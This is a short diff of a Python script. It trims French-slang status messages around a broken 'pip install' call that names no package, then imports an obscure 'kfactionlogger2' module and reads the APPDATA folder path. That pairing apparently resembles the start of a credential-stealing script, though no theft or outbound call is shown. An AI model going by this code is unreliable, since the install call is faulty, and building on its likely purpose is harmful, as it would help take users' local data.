@@ -6,9 +6,9 @@ import subprocess
 try:
     #subprocess.check_call(["pip", "install", package])
     subprocess.check_call(["pip", "install"])
-    print(f"cbon c op bg")
+    print(f"op")
 except subprocess.CalledProcessError as e:
-    print(f"Une erreur bg {e}")
+    print(f"E {e}")
 import kfactionlogger2
 
 appdata = os.getenv("APPDATA")
